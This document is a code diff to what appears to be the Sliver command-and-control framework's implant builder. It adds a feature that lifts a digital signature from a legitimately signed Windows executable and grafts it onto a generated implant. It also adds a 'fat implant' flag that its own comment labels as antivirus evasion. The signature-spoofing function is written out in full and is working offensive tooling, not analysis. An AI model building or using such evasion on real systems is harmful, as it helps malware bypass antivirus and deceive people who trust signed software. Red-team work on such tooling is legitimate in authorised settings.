@@ -39,6 +39,7 @@ import (
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/util"
+	"github.com/bishopfox/sliver/util/sigthief"
 	"github.com/spf13/cobra"
 )
 
@@ -373,6 +374,12 @@ func parseCompileFlags(cmd *cobra.Command, con *console.SliverClient) (string, *
 		c2Profile = consts.DefaultC2Profile
 	}
 
+	// Digital signature evasion
+	signWith, _ := cmd.Flags().GetString("sign-with")
+
+	// Fat implant generation for AV evasion
+	fatImplant, _ := cmd.Flags().GetBool("fat")
+
 	// exports if its a shared library
 
 	config := &clientpb.ImplantConfig{
@@ -415,6 +422,8 @@ func parseCompileFlags(cmd *cobra.Command, con *console.SliverClient) (string, *
 
 		DebugFile:        debugFile,
 		HTTPC2ConfigName: c2Profile,
+		SignWith:         signWith,
+		FatImplant:       fatImplant,
 	}
 
 	return name, config
@@ -984,6 +993,20 @@ func compile(name string, config *clientpb.ImplantConfig, save string, con *cons
 		con.PrintErrorf("Failed to write to: %s\n", saveTo)
 		return nil, err
 	}
+
+	// Apply digital signature if specified (Windows only)
+	if config.SignWith != "" && config.GOOS == "windows" {
+		finalPath, err := applySigThiefSigning(saveTo, config.SignWith, con)
+		if err != nil {
+			con.PrintWarnf("Failed to apply digital signature: %s\n", err)
+		} else {
+			saveTo = finalPath
+			con.PrintInfof("Digital signature applied from: %s\n", config.SignWith)
+		}
+	} else if config.SignWith != "" && config.GOOS != "windows" {
+		con.PrintWarnf("Digital signature spoofing is only supported on Windows targets\n")
+	}
+
 	con.PrintInfof("Implant saved to %s\n", saveTo)
 	return generated.File, err
 }
@@ -1097,4 +1120,51 @@ func selectExternalBuilder(builders []*clientpb.Builder, _ *console.SliverClient
 		}
 	}
 	return nil, ErrNoValidBuilders
+}
+
+// applySigThiefSigning applies digital signature spoofing to a compiled implant
+func applySigThiefSigning(implantPath, signaturePath string, con *console.SliverClient) (string, error) {
+	// Validate that signature source file exists and is signed
+	if _, err := os.Stat(signaturePath); os.IsNotExist(err) {
+		return "", fmt.Errorf("signature source file does not exist: %s", signaturePath)
+	}
+
+	// Check if source file is actually signed
+	isSigned, err := sigthief.IsSignedExecutable(signaturePath)
+	if err != nil {
+		return "", fmt.Errorf("failed to check if source file is signed: %v", err)
+	}
+	if !isSigned {
+		return "", fmt.Errorf("source file is not digitally signed: %s", signaturePath)
+	}
+
+	con.PrintInfof("Extracting digital signature from: %s\n", signaturePath)
+
+	// Extract signature from source file
+	signature, err := sigthief.ExtractSignature(signaturePath)
+	if err != nil {
+		return "", fmt.Errorf("failed to extract signature: %v", err)
+	}
+
+	// Create output path for signed implant
+	dir := filepath.Dir(implantPath)
+	base := filepath.Base(implantPath)
+	ext := filepath.Ext(base)
+	name := strings.TrimSuffix(base, ext)
+	signedPath := filepath.Join(dir, name+"_signed"+ext)
+
+	con.PrintInfof("Applying signature to implant: %s\n", signedPath)
+
+	// Apply signature to implant
+	err = sigthief.ApplySignature(implantPath, signature, signedPath)
+	if err != nil {
+		return "", fmt.Errorf("failed to apply signature: %v", err)
+	}
+
+	// Remove original unsigned implant
+	if err := os.Remove(implantPath); err != nil {
+		con.PrintWarnf("Failed to remove original unsigned implant: %v\n", err)
+	}
+
+	return signedPath, nil
 }
